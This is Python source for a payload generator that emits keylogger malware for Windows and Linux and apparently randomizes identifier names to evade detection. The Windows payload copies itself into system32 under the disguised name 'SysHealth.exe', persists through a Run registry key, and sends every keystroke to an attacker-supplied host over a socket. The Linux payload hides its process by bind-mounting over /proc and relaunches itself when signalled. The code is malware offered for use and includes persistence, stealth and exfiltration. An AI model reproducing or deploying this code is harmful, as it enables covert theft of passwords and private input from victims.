def _get_keylogger(host : str, port : int , platform : str, strs : list):
    if platform == 'WINDOWS':
        return """
import socket, os, sys\nfrom winreg import OpenKey, SetValueEx\nfrom pynput import Listener, Key
def {keepyourselfalive}() :\n\tf = open(str(__file__) , "rb")
\n\tff = open("C:\\Windows\\system32\\SysHealth.exe" , "wb") 
\tff.write(f.read())\n\tf.close()\n\t\n\tff.close()os.system("C:\\Windows\\system32\\SysHealth.exe")
\tSetValueEx("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "System Health",0,"REG_SZ", "C:\\Windows\\system32\\SysHealth.exe")
{keepyourselfalive}()
def {on_press}(k):\n\tconn.send(str(k).encode("UTF-8"))
{connected} = False\nwhile not {connected} :\n\ttry :
\t\tconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
\t\tconn.connect(('{host}' , int({port})))
\t\t{connected} = True 
\texcept :\n\t{connected} = False\n\twhile {connected} :\n\t\ttry : 
\t\t\twith Listener(on_press={on_press}) as l:
\t\t\t\tl.join()
\t\texcept :
\t\t\t{connected} = False
                """.format(port = str(port) , host = host , keepyourselfalive = strs[0], 
                           connected = strs[1], on_press = strs[2])
    elif platform == 'LINUX':
        return """
import os,subprocess, string, socket\nfrom pynput import Key,Listener
def {relaunch}():\n\tproc = subprocess.Popen(
\t" ".join(sys.argv), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
def {hide_process}():\n\tch = string.uppercase + string.digits
\ttoken = "".join(random.choice(ch) for i in range(32))
\tif not os.path.isdir("/tmp/%s" % (token)) :\n\tif os.popen("sudo whoami").read() == "root":
\tos.system("sudo mkdir /tmp/%s && sudo mount -o bind /tmp/%s /proc/%s" % (os.getpid(), token, os.getpid()))
\tsignal.signal(signal.SIGTERM, {relaunch})\n\tsignal.signal(signal.SIGTINT, {relaunch})\n{hide_process}()
def {on_press}(k):\n\tconn.send(str(k).encode("UTF-8"))
{connected} = False\nwhile not {connected} :\n\ttry :
\t\tconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
\t\tconn.connect(('{host}' , int({port})))
\t\t{connected} = True 
\texcept :\n\t{connected} = False\n\twhile {connected} :\n\t\ttry : 
\t\t\twith Listener(on_press={on_press}) as l:
\t\t\t\tl.join()
\t\texcept :
\t\t\t{connected} = False
""".format(port = str(port) , host = host, hide_process = strs[0], relaunch = strs[1], connected = strs[2], on_press = strs[3])